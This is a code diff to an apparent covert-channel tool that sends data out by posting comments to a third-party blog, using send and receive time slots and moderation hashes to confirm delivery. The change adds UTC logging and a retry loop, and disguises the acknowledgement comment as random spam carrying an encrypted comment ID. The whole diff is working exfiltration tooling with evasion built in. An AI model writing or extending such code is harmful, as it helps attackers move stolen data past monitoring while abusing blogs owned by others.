@@ -190,7 +190,7 @@ def send_data(channel, comment, send_config):
     while True:
         delay_to_timeslot(send_config.send_time_slot)
 
-        log_print("[INFO] send_data: Sending data " + str(comment.comment_id) + " at " + str(datetime.datetime.now().time()), 2)
+        log_print("[INFO] send_data: Sending data " + str(comment.comment_id) + " at " + str(datetime.datetime.utcnow().time()), 2)
 
         response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment)
         if response.html_response_code == 409:
@@ -200,19 +200,25 @@ def send_data(channel, comment, send_config):
         log_print("## send_data: " + str(response.html_response_code) + ", " + str(response.url) + ", " + str(response.moderation_hash), 2)
 
         if send_config.confirm_time_slot:
-            delay_to_timeslot(send_config.confirm_time_slot)
+            is_comment_success = False
+            while True:
+                delay_to_timeslot(send_config.confirm_time_slot)
 
-            ack_comment = comment
-            ack_comment.sender.name = comment.comment_id
-            ack_comment.sender.email = comment.comment_id.lower() + "@gmail.com"
-            ack_comment.comment = comment.comment_id
-            response = response = submit_comment(channel.target_blog, channel.ack_channel_id, ack_comment)
-            if "Duplicate" in response.html_response:
-                # If it's duplicated, that means that the server successfully got the comment.
-                log_print("[INFO] send_data: Comment submitted and confirmed.", 1)
+                ack_comment = comment
+                ack_comment.sender.name = comment.comment_id
+                ack_comment.sender.email = comment.comment_id.lower() + "@gmail.com"
+                ack_comment.comment = generate_random_spam_comment(0) + encrypt_decript_string(comment.comment_id)
+                response = response = submit_comment(channel.target_blog, channel.ack_channel_id, ack_comment)
+                if "Duplicate" in response.html_response:
+                    # If it's duplicated, that means that the server successfully got the comment.
+                    log_print("[INFO] send_data: Comment submitted and confirmed.", 1)
+                    is_comment_success = True
+                    break
+                else:
+                    log_print("[INFO + " + str(datetime.datetime.utcnow()) + " ] send_data: Comment was not received by server. Resending...", 1)
+
+            if is_comment_success:
                 break
-            else:
-                log_print("[INFO + " + str(datetime.datetime.utcnow()) + " ] send_data: Comment was not received by server. Resending...", 1)
         else:
             break
 
@@ -235,12 +241,13 @@ def get_moderation_hash_at_current_time(channel):
 def receive_data(channel, num_of_receivers, recv_config):
     received_data = []
     
-    log_print("[INFO] receive_data: Delaying to receive timeslot. " + str(recv_config.recv_time_slot), 2)
+    log_print("[INFO " + str(datetime.datetime.utcnow()) + " ] receive_data: Delaying to receive timeslot. " + str(recv_config.recv_time_slot), 2)
     delay_to_timeslot(recv_config.recv_time_slot)
+    log_print("[INFO " + str(datetime.datetime.utcnow()) + " ] receive_data: Getting moderation hash at current index.", 2)
     current_hash, server_index = get_moderation_hash_at_current_time(channel)
 
-    log_print("[INFO] receive_data: Current hash is: " + current_hash, 2)
-    log_print("[INFO] receive_data: Delaying to process timeslot. " + str(recv_config.process_time_slot), 2)
+    log_print("[INFO " + str(datetime.datetime.utcnow()) + " ] receive_data: Current hash is: " + current_hash, 2)
+    log_print("[INFO " + str(datetime.datetime.utcnow()) + " ] receive_data: Delaying to process timeslot. " + str(recv_config.process_time_slot), 2)
 
     delay_to_timeslot(recv_config.process_time_slot)
 
